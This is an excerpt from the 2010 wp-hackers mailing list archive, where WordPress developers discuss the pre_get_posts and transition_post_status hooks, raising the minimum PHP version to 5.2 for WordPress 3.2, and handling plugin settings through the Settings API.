In conclusion, don't knock pre_get_posts :)  It's a perfectly cromulent hook.

Mike
--mdawaffe

From wp at andrewnacin.com  Sat Jul 24 10:04:19 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Sat, 24 Jul 2010 06:04:19 -0400
Subject: [wp-hackers] pre_get_posts problem
In-Reply-To: <AANLkTimGGgDDV19buYxW9XdLyEAF-KiSb3__fX1MLu7n@mail.gmail.com>
References: <AANLkTik2qEdPZ4u41aAqfJGXY7V7vi1f4ql8olZ3XYvU@mail.gmail.com> 
	<AANLkTincremiNrvDXjNpW_mYrpuROyrjbK345rqAmkg0@mail.gmail.com> 
	<AANLkTimGGgDDV19buYxW9XdLyEAF-KiSb3__fX1MLu7n@mail.gmail.com>
Message-ID: <AANLkTinL67VgTvWzLrsRzvNTcCmGZdMDY2NuM=0evuod@mail.gmail.com>

On Sat, Jul 24, 2010 at 5:22 AM, Michael D Adams <mda at blogwaffe.com> wrote:
>
> That should work for this scenario, but the hooks in the WP class
> (parse_request, request, etc.) only affect the main loop (mostly).  If
> you want your plugin to be more invasive than that (widgets,
> sub-loops, additional loops, etc.), pre_get_posts is the way to go.
>
> If you want to use pre_get_posts in this case, you have to check two
> things:
> 1. is_author() -- are we on an author archive page?
> 2. $query->is_author -- is this query an author query, or some other
> query on that page?
>
> In conclusion, don't knock pre_get_posts :)  It's a perfectly cromulent
> hook.
>

Mike,

Excellent points. The background here is that more than a few custom post
type tutorials out there seem to reference pre_get_posts when they're not
looking for the side effects and only want to modify the main query. Some
even suggest additionally checking for suppress_filters == false, to make
sure it isn't interfering with get_posts(). Obviously, that's not the right
way to do it either, since A) get_posts() can be called with
suppress_filters = true, B) it still interferes with new WP_Query
instantiations, and C) it's generally going to be the wrong hook for what
they're trying to do anyway.

I'm not knocking the hook -- there are great use cases for it, and there's a
way to leverage it here as well (as you illustrate). But the tutorials,
based on their use cases, really should be using request/parse_request. (As
I haven't seen a tutorial cover them, I'm writing one in the next browser
tab over.)

Nacin

From mikeschinkel at newclarity.net  Sat Jul 24 14:14:04 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sat, 24 Jul 2010 10:14:04 -0400
Subject: [wp-hackers] Best Practice for hooking wp_insert_post()
Message-ID: <066E3EA7-5E29-48FA-AFEE-3FA09E90BE30@newclarity.net>

Hi all:

I'd like to ask about best practices for hooking wp_insert_post().  The questions are when and why to use "save_post" vs. "wp_insert_post" and more importantly what's the best way to determine if a post is being added or updated, or is an auto-post? Actually, I'd love to have that all clarified.   

I came up with the following "artifacts" that imply to me it is in "insert" mode but I can't be sure:

$post->post_status=='auto-draft'
empty($post->guid)
empty($post->post_name)

Thanks,

-Mike

From wp-hackers at striderweb.com  Sat Jul 24 16:53:59 2010
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Sat, 24 Jul 2010 11:53:59 -0500
Subject: [wp-hackers] PHP 5.2 that WordPress 3.2 requires
In-Reply-To: <AANLkTimXXqz32yvfUdZoFKdNB=2pL5KmLb=Bjs-cACMh@mail.gmail.com>
References: <COL122-DS175FC78A4BB1952311952E9FA30@phx.gbl>
	<AANLkTin11fiTAb7BqGVBypegBwcDT9Agf1nH+mm5LPYY@mail.gmail.com>
	<COL122-DS427DB80C6A97A37DF02BD9FA40@phx.gbl>
	<AANLkTimXXqz32yvfUdZoFKdNB=2pL5KmLb=Bjs-cACMh@mail.gmail.com>
Message-ID: <A14CDF89-4581-45CB-B2CD-A4BDDED62101@striderweb.com>


On Jul 24, 2010, at 3:50 AM, Otto wrote:

> PHP versions 5.2.0-3 all had fairly critical bugs that would very
> likely cause issues. 5.2.4 was the first version that worked well.

If this is true, is there a *specific* reason we're choosing to go to only 5.2.0 ?  Aren't we just asking for headaches?

Or do our usage statistics show a lot of people still using 5.2.0 ?

Not arguing, just asking.  Avoiding "critical" bugs seems like a good idea to me....

Stephen

From peaceable_whale at hotmail.com  Sat Jul 24 17:33:24 2010
From: peaceable_whale at hotmail.com (Franklin Tse)
Date: Sun, 25 Jul 2010 01:33:24 +0800
Subject: [wp-hackers] PHP 5.2 that WordPress 3.2 requires
In-Reply-To: <A14CDF89-4581-45CB-B2CD-A4BDDED62101@striderweb.com>
References: <COL122-DS175FC78A4BB1952311952E9FA30@phx.gbl><AANLkTin11fiTAb7BqGVBypegBwcDT9Agf1nH+mm5LPYY@mail.gmail.com><COL122-DS427DB80C6A97A37DF02BD9FA40@phx.gbl><AANLkTimXXqz32yvfUdZoFKdNB=2pL5KmLb=Bjs-cACMh@mail.gmail.com>
	<A14CDF89-4581-45CB-B2CD-A4BDDED62101@striderweb.com>
Message-ID: <COL122-DS16629E59B0828A7878A4689FA40@phx.gbl>

Drupal had problem with PHP 5.2.0 too:

http://drupal.org/node/807622
http://api.drupalecommerce.org/api/function/file_directory_temp/7

I don't think it is good to stay in 5.2.0. One of the reasons to increase the PHP version requirement, IMO, is to reduce the need of workarounds and writing own implementation of PHP functions.

-Franklin

--------------------------------------------------
From: "Stephen Rider" <wp-hackers at striderweb.com>
Date: Sunday, 25 July, 2010 00:53
To: <wp-hackers at lists.automattic.com>
Subject: Re: [wp-hackers] PHP 5.2 that WordPress 3.2 requires

> 
> On Jul 24, 2010, at 3:50 AM, Otto wrote:
> 
>> PHP versions 5.2.0-3 all had fairly critical bugs that would very
>> likely cause issues. 5.2.4 was the first version that worked well.
> 
> If this is true, is there a *specific* reason we're choosing to go to only 5.2.0 ?  Aren't we just asking for headaches?
> 
> Or do our usage statistics show a lot of people still using 5.2.0 ?
> 
> Not arguing, just asking.  Avoiding "critical" bugs seems like a good idea to me....
> 
> Stephen
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 

From mark at simplercomputing.net  Sat Jul 24 18:49:38 2010
From: mark at simplercomputing.net (Mark E)
Date: Sat, 24 Jul 2010 12:49:38 -0600
Subject: [wp-hackers] Best Practice for hooking wp_insert_post()
In-Reply-To: <066E3EA7-5E29-48FA-AFEE-3FA09E90BE30@newclarity.net>
References: <066E3EA7-5E29-48FA-AFEE-3FA09E90BE30@newclarity.net>
Message-ID: <4C4B35C2.1020702@simplercomputing.net>



On 07/24/2010 08:14 AM, Mike Schinkel wrote:
> Hi all:
>
> I'd like to ask about best practices for hooking wp_insert_post().
> The questions are when and why to use "save_post" vs.
> "wp_insert_post" and more importantly what's the best way to
> determine if a post is being added or updated, or is an auto-post?
> Actually, I'd love to have that all clarified.

If I remember right, auto-draft is a copy of post saved automatically 
while the WP post screen is open, and that particular save process is 
driven by Javascript.

You can use wp_insert_post() to add post content, build an array of 
parameters and pass it to the function and if the post is saved 
successfully a post ID number is returned.

If you look at the code for the function in wp-includes/post.php you'll 
see an array of default parameters.

Mark

From wp at andrewnacin.com  Sat Jul 24 20:49:13 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Sat, 24 Jul 2010 16:49:13 -0400
Subject: [wp-hackers] PHP 5.2 that WordPress 3.2 requires
In-Reply-To: <COL122-DS16629E59B0828A7878A4689FA40@phx.gbl>
References: <COL122-DS175FC78A4BB1952311952E9FA30@phx.gbl> 
	<AANLkTin11fiTAb7BqGVBypegBwcDT9Agf1nH+mm5LPYY@mail.gmail.com> 
	<COL122-DS427DB80C6A97A37DF02BD9FA40@phx.gbl>
	<AANLkTimXXqz32yvfUdZoFKdNB=2pL5KmLb=Bjs-cACMh@mail.gmail.com> 
	<A14CDF89-4581-45CB-B2CD-A4BDDED62101@striderweb.com>
	<COL122-DS16629E59B0828A7878A4689FA40@phx.gbl>
Message-ID: <AANLkTi=7f84wkoqHtP7XoLR37j_8j12cEm9QwtbcrqPe@mail.gmail.com>

On Sat, Jul 24, 2010 at 1:33 PM, Franklin Tse
<peaceable_whale at hotmail.com>wrote:

> I don't think it is good to stay in 5.2.0. One of the reasons to increase
> the PHP version requirement, IMO, is to reduce the need of workarounds and
> writing own implementation of PHP functions.
>

And we are. For the following versions: 4.3.x, 4.4.x, 5.0.x, 5.1.x. Of all
the problems we've had with PHP over the years, I'll gladly take PHP 5.2.0+
as a minimum requirement and we can work around the bugs. That said:

On Sat, Jul 24, 2010 at 12:53 PM, Stephen Rider <wp-hackers at striderweb.com>
 wrote:

> If this is true, is there a *specific* reason we're choosing to go to only
> 5.2.0 ?  Aren't we just asking for headaches?
>

We're asking for far less headaches than we currently have, that's for sure.
Yes, the specific reason is we wanted to follow Joomla, Drupal, and the
GoPHP5 initiative, and we believed that 5.2.0 would be adequate. The benefit
of it being a major release helps a bit.

Or do our usage statistics show a lot of people still using 5.2.0 ?
>

I will check on this early next week -- I am curious as well.


> Not arguing, just asking.  Avoiding "critical" bugs seems like a good idea
> to me....
>

I agree! But we've been avoiding them for years under a wider number of
versions. I like our chances against the critical bugs now.

From wp at andrewnacin.com  Sat Jul 24 20:54:39 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Sat, 24 Jul 2010 16:54:39 -0400
Subject: [wp-hackers] Best Practice for hooking wp_insert_post()
In-Reply-To: <4C4B35C2.1020702@simplercomputing.net>
References: <066E3EA7-5E29-48FA-AFEE-3FA09E90BE30@newclarity.net> 
	<4C4B35C2.1020702@simplercomputing.net>
Message-ID: <AANLkTimx89SyQAw2Js0Frwh2QkU-Ua3=pPKb+f-h0SD9@mail.gmail.com>

On Sat, Jul 24, 2010 at 2:49 PM, Mark E <mark at simplercomputing.net> wrote:

> On 07/24/2010 08:14 AM, Mike Schinkel wrote:
>
>> Hi all:
>>
>> I'd like to ask about best practices for hooking wp_insert_post().
>> The questions are when and why to use "save_post" vs.
>> "wp_insert_post" and more importantly what's the best way to
>> determine if a post is being added or updated, or is an auto-post?
>> Actually, I'd love to have that all clarified.
>>
>
> If I remember right, auto-draft is a copy of post saved automatically while
> the WP post screen is open, and that particular save process is driven by
> Javascript.
>

Auto-drafts are new in 3.0. They're designed to prevent the need to wait for
an autosave, which is what you're describing. The moment you visit the
post-new.php screen, you now have a post ID in the form of an auto-draft.
This allows you to immediately attach media, work with custom fields,
featured images, and the like. The auto-drafts that don't turn into posts
are then cleaned up after a week or so.

Here's the ticket we managed the development of this in:
http://core.trac.wordpress.org/ticket/11889.

It does have the side effect of triggering save_post. The post status
transition hooks are probably better to use in most cases however.

From wordpress at santosj.name  Sat Jul 24 22:12:25 2010
From: wordpress at santosj.name (Jacob Santos)
Date: Sat, 24 Jul 2010 17:12:25 -0500
Subject: [wp-hackers] PHP 5.2 that WordPress 3.2 requires
In-Reply-To: <AANLkTi=7f84wkoqHtP7XoLR37j_8j12cEm9QwtbcrqPe@mail.gmail.com>
References: <COL122-DS175FC78A4BB1952311952E9FA30@phx.gbl>
	<AANLkTin11fiTAb7BqGVBypegBwcDT9Agf1nH+mm5LPYY@mail.gmail.com>
	<COL122-DS427DB80C6A97A37DF02BD9FA40@phx.gbl>	<AANLkTimXXqz32yvfUdZoFKdNB=2pL5KmLb=Bjs-cACMh@mail.gmail.com>
	<A14CDF89-4581-45CB-B2CD-A4BDDED62101@striderweb.com>	<COL122-DS16629E59B0828A7878A4689FA40@phx.gbl>
	<AANLkTi=7f84wkoqHtP7XoLR37j_8j12cEm9QwtbcrqPe@mail.gmail.com>
Message-ID: <4C4B6549.5010805@santosj.name>

I agree with Nacin with this one. Just because the requirement is for 
PHP 5.2.0, doesn't mean the server is required to use that version and 
thankfully most should be at least PHP 5.2.2-6. It will be relatively 
simple to test on latest for development and then switch to PHP5.2.0 for 
regression testing and developing workarounds.

It is unlikely that WordPress will be using PDO and SPL at the WordPress 
3.2.0 release. In fact, majority of SPL might as well be off limits 
since the core developers with commit access has shown no interest in 
updating the current paradigm to those newer (old) conventions [1]. 
While the requirement will be raised and possibility some backwards 
compatibility with PHP4 will be removed, it seems unlikely that anything 
really solidifying WordPress into PHP5.2 will happen in that version.

Of course, WordPress 3.2 is a year away, so much can and hopefully may 
change during that time.

Jacob Santos

[1] The correct way of doing things be damned! :) Actually, I kid. 
truthfully, the point Peter Westwood makes is that when you have to 
rewrite large portions of existing and working code to match a 
new-to-WordPress convention, then it requires a great deal of 
contributor effort. Which means testing, fixes, more testing, more 
fixes. Which increases the workload of what would seem to be a simple 
fix. However, at some point the WTF?s that exist in WordPress will have 
to be rewritten regardless, so either rewrite the code and ride the 
defect train to slow improvement or include the new feature and slowly 
move to the new code until it is tested and reasonably sure that no one 
is using the old code.


On 7/24/2010 3:49 PM, Andrew Nacin wrote:
> On Sat, Jul 24, 2010 at 1:33 PM, Franklin Tse
> <peaceable_whale at hotmail.com>wrote:
>
>    
>> I don't think it is good to stay in 5.2.0. One of the reasons to increase
>> the PHP version requirement, IMO, is to reduce the need of workarounds and
>> writing own implementation of PHP functions.
>>
>>      
> And we are. For the following versions: 4.3.x, 4.4.x, 5.0.x, 5.1.x. Of all
> the problems we've had with PHP over the years, I'll gladly take PHP 5.2.0+
> as a minimum requirement and we can work around the bugs. That said:
>
> On Sat, Jul 24, 2010 at 12:53 PM, Stephen Rider<wp-hackers at striderweb.com>
>   wrote:
>
>    
>> If this is true, is there a *specific* reason we're choosing to go to only
>> 5.2.0 ?  Aren't we just asking for headaches?
>>
>>      
> We're asking for far less headaches than we currently have, that's for sure.
> Yes, the specific reason is we wanted to follow Joomla, Drupal, and the
> GoPHP5 initiative, and we believed that 5.2.0 would be adequate. The benefit
> of it being a major release helps a bit.
>
> Or do our usage statistics show a lot of people still using 5.2.0 ?
>    
>>      
> I will check on this early next week -- I am curious as well.
>
>
>    
>> Not arguing, just asking.  Avoiding "critical" bugs seems like a good idea
>> to me....
>>
>>      
> I agree! But we've been avoiding them for years under a wider number of
> versions. I like our chances against the critical bugs now.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>    


From wordpress at dd32.id.au  Sun Jul 25 00:41:45 2010
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Sun, 25 Jul 2010 10:41:45 +1000
Subject: [wp-hackers] PHP 5.2 that WordPress 3.2 requires
In-Reply-To: <COL122-DS16629E59B0828A7878A4689FA40@phx.gbl>
References: <COL122-DS175FC78A4BB1952311952E9FA30@phx.gbl>
	<AANLkTin11fiTAb7BqGVBypegBwcDT9Agf1nH+mm5LPYY@mail.gmail.com>
	<COL122-DS427DB80C6A97A37DF02BD9FA40@phx.gbl>
	<AANLkTimXXqz32yvfUdZoFKdNB=2pL5KmLb=Bjs-cACMh@mail.gmail.com>
	<A14CDF89-4581-45CB-B2CD-A4BDDED62101@striderweb.com>
	<COL122-DS16629E59B0828A7878A4689FA40@phx.gbl>
Message-ID: <op.vgdivvswspxmuu@ho.st>

On Sun, 25 Jul 2010 03:33:24 +1000, Franklin Tse  
<peaceable_whale at hotmail.com> wrote:

> Drupal had problem with PHP 5.2.0 too:
>
> http://drupal.org/node/807622
> http://api.drupalecommerce.org/api/function/file_directory_temp/7
>
> I don't think it is good to stay in 5.2.0. One of the reasons to  
> increase the PHP version requirement, IMO, is to reduce the need of  
> workarounds and writing own implementation of PHP functions.

Just like to point out, that thats not a bug in PHP.. But just them using  
5.2.1 functionality when they require 5.2, It the same as using PHP 5.3  
functions.
But that function cant be relied upon either, just like they don't rely on  
it there, often bad PHP setups will have the temporary directory set to a  
directory which cant be written to.. WordPress works around those hosts,  
nothing will change going forward there either, we're still going to have  
to work with bad PHP configurations..

WordPress already uses the function pointed out there, but we check for it  
before using it, Its not a "workaround", its the process of taking  
advantage of what the system supports, and degrading nicely. The same is  
done for Javascript/CSS in browsers, Droping support for < IE8 would be  
nice(:P) But.. isnt actually required, as long as functions degrade nicely  
in older browsers (for example, Rounded corners)

Dion Hulse / dd32

Contact:
  e: contact at dd32.id.au
  Web: http://dd32.id.au/

From peaceable_whale at hotmail.com  Sun Jul 25 04:04:04 2010
From: peaceable_whale at hotmail.com (Franklin Tse)
Date: Sun, 25 Jul 2010 12:04:04 +0800
Subject: [wp-hackers] PHP 5.2 that WordPress 3.2 requires
In-Reply-To: <4C4B6549.5010805@santosj.name>
References: <COL122-DS175FC78A4BB1952311952E9FA30@phx.gbl><AANLkTin11fiTAb7BqGVBypegBwcDT9Agf1nH+mm5LPYY@mail.gmail.com><COL122-DS427DB80C6A97A37DF02BD9FA40@phx.gbl>	<AANLkTimXXqz32yvfUdZoFKdNB=2pL5KmLb=Bjs-cACMh@mail.gmail.com><A14CDF89-4581-45CB-B2CD-A4BDDED62101@striderweb.com>	<COL122-DS16629E59B0828A7878A4689FA40@phx.gbl><AANLkTi=7f84wkoqHtP7XoLR37j_8j12cEm9QwtbcrqPe@mail.gmail.com>
	<4C4B6549.5010805@santosj.name>
Message-ID: <COL122-DS1459D4FE00D29FD200B1579FA50@phx.gbl>

From: "Jacob Santos" <wordpress at santosj.name>
Date: Sunday, 25 July, 2010 06:12
To: <wp-hackers at lists.automattic.com>
Subject: Re: [wp-hackers] PHP 5.2 that WordPress 3.2 requires

> I agree with Nacin with this one. Just because the requirement is for 
> PHP 5.2.0, doesn't mean the server is required to use that version and 
> thankfully most should be at least PHP 5.2.2-6. It will be relatively 
> simple to test on latest for development and then switch to PHP5.2.0 for 
> regression testing and developing workarounds.

If the most servers are at least PHP 5.2.2-6, there might not be a very good reason for WordPress to stay in a less commonly used version. 

From bhalla.kunal at gmail.com  Sun Jul 25 04:18:59 2010
From: bhalla.kunal at gmail.com (Kunal Bhalla)
Date: Sun, 25 Jul 2010 09:48:59 +0530
Subject: [wp-hackers] Best Practice for hooking wp_insert_post()
Message-ID: <AANLkTi=V4Nva7BgmQ+EYJqA6Ukj5=dJr4wMTtbDwP1B+@mail.gmail.com>

I had to do that recently for my project -- create an 'activity' post when a
post of a particular type was published. As far as I remember,
wp_insert_post is called for everything, updating, whatever. I found it
simpler to hook into the transition post status (like nacin said), checking
that the post _was_ of the type I needed (automatically eliminating drafts,
auto-saves), whether the new status was publish, and that the old status
wasn't.

I've paste-binned the relevant bits of code here:
http://pastebin.com/z9SndiU5

Kunal
@kunalbhalla

From otto at ottodestruct.com  Sun Jul 25 05:55:23 2010
From: otto at ottodestruct.com (Otto)
Date: Sun, 25 Jul 2010 00:55:23 -0500
Subject: [wp-hackers] PHP 5.2 that WordPress 3.2 requires
In-Reply-To: <COL122-DS1459D4FE00D29FD200B1579FA50@phx.gbl>
References: <COL122-DS175FC78A4BB1952311952E9FA30@phx.gbl> 
	<AANLkTin11fiTAb7BqGVBypegBwcDT9Agf1nH+mm5LPYY@mail.gmail.com> 
	<COL122-DS427DB80C6A97A37DF02BD9FA40@phx.gbl>
	<AANLkTimXXqz32yvfUdZoFKdNB=2pL5KmLb=Bjs-cACMh@mail.gmail.com> 
	<A14CDF89-4581-45CB-B2CD-A4BDDED62101@striderweb.com>
	<COL122-DS16629E59B0828A7878A4689FA40@phx.gbl> 
	<AANLkTi=7f84wkoqHtP7XoLR37j_8j12cEm9QwtbcrqPe@mail.gmail.com> 
	<4C4B6549.5010805@santosj.name>
	<COL122-DS1459D4FE00D29FD200B1579FA50@phx.gbl>
Message-ID: <AANLkTikYFTKhLT4nXtU-V9rixbmH2xvjusWdMy8kXXwt@mail.gmail.com>

I think we need to step back and understand the reason for the version
change a second.

If a host sees "WordPress is only going to support PHP 5.2 in the
future", and they currently run PHP 4, and a lot of their customers
run WP, then they're going to upgrade pronto.

At the same time, they're probably going to upgrade to the latest PHP
they get their hands on which is also considered stable. This
naturally excludes PHP < 5.3.4.

What it comes down to is this: I don't think it makes any difference
whether WP says "5.2.0" or "5.2.4". It's a non-issue. The hosts on top
of their things are already fine. The ones that are not are either not
going to notice and stuff breaks, or they'll have somebody competent
do their upgrades and they'll be fine.

So relax. Just say "5.2" and be done with it. If it's a problem, then
it'll be a minority issue and we'll workaround it or tell hosts "hey,
you're running old broken crap" and they'll fix it.

No worries.

-Otto



On Sat, Jul 24, 2010 at 11:04 PM, Franklin Tse
<peaceable_whale at hotmail.com> wrote:
> From: "Jacob Santos" <wordpress at santosj.name>
> Date: Sunday, 25 July, 2010 06:12
> To: <wp-hackers at lists.automattic.com>
> Subject: Re: [wp-hackers] PHP 5.2 that WordPress 3.2 requires
>
>> I agree with Nacin with this one. Just because the requirement is for
>> PHP 5.2.0, doesn't mean the server is required to use that version and
>> thankfully most should be at least PHP 5.2.2-6. It will be relatively
>> simple to test on latest for development and then switch to PHP5.2.0 for
>> regression testing and developing workarounds.
>
> If the most servers are at least PHP 5.2.2-6, there might not be a very good reason for WordPress to stay in a less commonly used version.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From otto at ottodestruct.com  Sun Jul 25 05:56:28 2010
From: otto at ottodestruct.com (Otto)
Date: Sun, 25 Jul 2010 00:56:28 -0500
Subject: [wp-hackers] PHP 5.2 that WordPress 3.2 requires
In-Reply-To: <AANLkTikYFTKhLT4nXtU-V9rixbmH2xvjusWdMy8kXXwt@mail.gmail.com>
References: <COL122-DS175FC78A4BB1952311952E9FA30@phx.gbl> 
	<AANLkTin11fiTAb7BqGVBypegBwcDT9Agf1nH+mm5LPYY@mail.gmail.com> 
	<COL122-DS427DB80C6A97A37DF02BD9FA40@phx.gbl>
	<AANLkTimXXqz32yvfUdZoFKdNB=2pL5KmLb=Bjs-cACMh@mail.gmail.com> 
	<A14CDF89-4581-45CB-B2CD-A4BDDED62101@striderweb.com>
	<COL122-DS16629E59B0828A7878A4689FA40@phx.gbl> 
	<AANLkTi=7f84wkoqHtP7XoLR37j_8j12cEm9QwtbcrqPe@mail.gmail.com> 
	<4C4B6549.5010805@santosj.name>
	<COL122-DS1459D4FE00D29FD200B1579FA50@phx.gbl> 
	<AANLkTikYFTKhLT4nXtU-V9rixbmH2xvjusWdMy8kXXwt@mail.gmail.com>
Message-ID: <AANLkTikMwkrRTbKO5wHtODpykz_Ki+7ihgZWZtak9tUj@mail.gmail.com>

Correction: "This naturally excludes PHP < 5.2.4."

-Otto



On Sun, Jul 25, 2010 at 12:55 AM, Otto <otto at ottodestruct.com> wrote:
> This
> naturally excludes PHP < 5.3.4.

From otto at ottodestruct.com  Sun Jul 25 06:06:38 2010
From: otto at ottodestruct.com (Otto)
Date: Sun, 25 Jul 2010 01:06:38 -0500
Subject: [wp-hackers] Best Practice for hooking wp_insert_post()
In-Reply-To: <066E3EA7-5E29-48FA-AFEE-3FA09E90BE30@newclarity.net>
References: <066E3EA7-5E29-48FA-AFEE-3FA09E90BE30@newclarity.net>
Message-ID: <AANLkTi=YMFBEuYUiBbBd1uVCiXfHb8vC4fG6cE5i8_LD@mail.gmail.com>

I've had to do this a few times. The only way I found that doesn't
suck is to hook to transition_post_status like this:

add_action('transition_post_status','whatever',10,3);

Your whatever function will get $new, $old, $post, such that
$new = new post status ('publish')
$old = old post status
$post = the complete post object

By comparing new and old, you can determine if a post is being updated
or published or what.

Every other way I tried ended up with one-off anomalies.

-Otto



On Sat, Jul 24, 2010 at 9:14 AM, Mike Schinkel
<mikeschinkel at newclarity.net> wrote:
> Hi all:
>
> I'd like to ask about best practices for hooking wp_insert_post(). ?The questions are when and why to use "save_post" vs. "wp_insert_post" and more importantly what's the best way to determine if a post is being added or updated, or is an auto-post? Actually, I'd love to have that all clarified.
>
> I came up with the following "artifacts" that imply to me it is in "insert" mode but I can't be sure:
>
> $post->post_status=='auto-draft'
> empty($post->guid)
> empty($post->post_name)
>
> Thanks,
>
> -Mike
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From anca at anca.tv  Sun Jul 25 06:49:31 2010
From: anca at anca.tv (Anca Mosoiu)
Date: Sat, 24 Jul 2010 23:49:31 -0700
Subject: [wp-hackers] Best practices for plugin with complicated settings?
Message-ID: <8D0C461C-9FF2-4FCA-B001-EB6671DAA3A5@anca.tv>

Hello,

I'm working on a plugin that will be storing about 10-15 rows of options 
information, and I'm wondering about best practices for this.

The scenario:

My site is going to be connected with several other sites where content 
will be cross-linked.  For each "sister site", I need to store a URL, an 
authentication token, and a list of categories where the URL will be 
displayed. 

The questions:

Is this data something I should store using the site options table, or 
should I make my own table?  Reading through the Plugin and Settings API 
sections, I didn't see any examples or information about settings that can have 
multiple values, or how to handle array values in a setting.  Does the 
Settings API automatically do the right thing when presented with a 
setting in array format?  

Does the site settings table work the same way as post meta, where we can
save multiple values with the same key.

This is my first foray into plugins with settings, so I'm hoping to 
start off on the right foot.

Thanks,

Anca.

From wp at andrewnacin.com  Sun Jul 25 07:06:59 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Sun, 25 Jul 2010 03:06:59 -0400
Subject: [wp-hackers] Best practices for plugin with complicated
	settings?
In-Reply-To: <8D0C461C-9FF2-4FCA-B001-EB6671DAA3A5@anca.tv>
References: <8D0C461C-9FF2-4FCA-B001-EB6671DAA3A5@anca.tv>
Message-ID: <AANLkTiktJfeOJubw__AWkivWKa5O78XWDCeg=tRzq8WD@mail.gmail.com>

On Sun, Jul 25, 2010 at 2:49 AM, Anca Mosoiu <anca at anca.tv> wrote:
>
> Does the site settings table work the same way as post meta, where we can save
> multiple values with the same key.


Yep! And that's strongly encouraged in most situations. No serialization
needed of course; WP handles that for you. WP handles a lot more than that
actually, as you'll see with the settings API.

You can use register_setting() to register a single setting for your plugin.
Then make sure you have a sanitization callback that can verify that you're
storing each of your sub-settings individually.

For settings fields, you'd then use setting_name[option_a], etc... Then WP
will receive an array of your options, pass it to the single sanitization
callback, and eventually store it as a single row in the database.

In your plugin, you can then make a single call to get_option() and you'll
have everything you need as an array.

(That said, if you're storing a good amount of data and you don't need all
of it autoloaded, you *may* want to consider having two separate options,
one autoloaded and one not. Then only loading the fat option when you need
it.)

Anyway, here's two good tutorials, one by Ozh and one by Otto. Both of these
are linked from the Codex page:
http://codex.wordpress.org/Settings_API
http://ottodestruct.com/blog/2009/wordpress-settings-api-tutorial/
http://planetozh.com/blog/2009/05/handling-plugins-options-in-wordpress-28-with-register_setting/

From ashishsainiashfame at gmail.com  Sun Jul 25 08:57:12 2010
From: ashishsainiashfame at gmail.com (Ashish Saini)
Date: Sun, 25 Jul 2010 14:27:12 +0530
Subject: [wp-hackers] Best practices for plugin with complicated
	settings?
In-Reply-To: <AANLkTiktJfeOJubw__AWkivWKa5O78XWDCeg=tRzq8WD@mail.gmail.com>
References: <8D0C461C-9FF2-4FCA-B001-EB6671DAA3A5@anca.tv>
	<AANLkTiktJfeOJubw__AWkivWKa5O78XWDCeg=tRzq8WD@mail.gmail.com>
Message-ID: <AANLkTi=w03Tu-tjcVKaHQD4=uD70kFQZBcT=a-AKfcx-@mail.gmail.com>

What if I have multiple option pages for my single setting? Do I need to do
anything extra to take care of that?

Thanks & Regards
Ashish Saini aka Ashfame
(Deserve Before You Desire)
Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com | Twitter
: http://twitter.com/ashfame


On Sun, Jul 25, 2010 at 12:36 PM, Andrew Nacin <wp at andrewnacin.com> wrote:

> On Sun, Jul 25, 2010 at 2:49 AM, Anca Mosoiu <anca at anca.tv> wrote:
> >
> > Does the site settings table work the same way as post meta, where we can
> save
> > multiple values with the same key.
>
>
> Yep! And that's strongly encouraged in most situations. No serialization
> needed of course; WP handles that for you. WP handles a lot more than that
> actually, as you'll see with the settings API.
>
> You can use register_setting() to register a single setting for your
> plugin.
> Then make sure you have a sanitization callback that can verify that you're
> storing each of your sub-settings individually.
>
> For settings fields, you'd then use setting_name[option_a], etc... Then WP
> will receive an array of your options, pass it to the single sanitization
> callback, and eventually store it as a single row in the database.
>
> In your plugin, you can then make a single call to get_option() and you'll
> have everything you need as an array.
>
> (That said, if you're storing a good amount of data and you don't need all
> of it autoloaded, you *may* want to consider having two separate options,
> one autoloaded and one not. Then only loading the fat option when you need
> it.)
>
> Anyway, here's two good tutorials, one by Ozh and one by Otto. Both of
> these
> are linked from the Codex page:
> http://codex.wordpress.org/Settings_API
> http://ottodestruct.com/blog/2009/wordpress-settings-api-tutorial/
>
> http://planetozh.com/blog/2009/05/handling-plugins-options-in-wordpress-28-with-register_setting/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wp at andrewnacin.com  Sun Jul 25 09:06:35 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Sun, 25 Jul 2010 05:06:35 -0400
Subject: [wp-hackers] Best practices for plugin with complicated
	settings?
In-Reply-To: <AANLkTi=w03Tu-tjcVKaHQD4=uD70kFQZBcT=a-AKfcx-@mail.gmail.com>
References: <8D0C461C-9FF2-4FCA-B001-EB6671DAA3A5@anca.tv> 
	<AANLkTiktJfeOJubw__AWkivWKa5O78XWDCeg=tRzq8WD@mail.gmail.com> 
	<AANLkTi=w03Tu-tjcVKaHQD4=uD70kFQZBcT=a-AKfcx-@mail.gmail.com>
Message-ID: <AANLkTi=5p4sDhnAVmcycgZiD=HW2qZr7-1LS1v6KR5RA@mail.gmail.com>

On Sun, Jul 25, 2010 at 4:57 AM, Ashish Saini
<ashishsainiashfame at gmail.com>wrote:

> What if I have multiple option pages for my single setting? Do I need to do
> anything extra to take care of that?
>

The way I'd do it is as follows:
 - Register the setting multiple times, for each option group (page).
 - In the sanitization callback(s), make sure you account for other indices
that may be stored but not accounted for on that page save. You can call
get_option() for example and make sure you keep the original indices you
want, and then replace the ones you're updating for that page.

Regardless, heavy whitelisting and sanitization is critical to ensure
stability and security.

From ashishsainiashfame at gmail.com  Sun Jul 25 10:39:47 2010
From: ashishsainiashfame at gmail.com (Ashish Saini)
Date: Sun, 25 Jul 2010 16:09:47 +0530
Subject: [wp-hackers] Best practices for plugin with complicated
	settings?
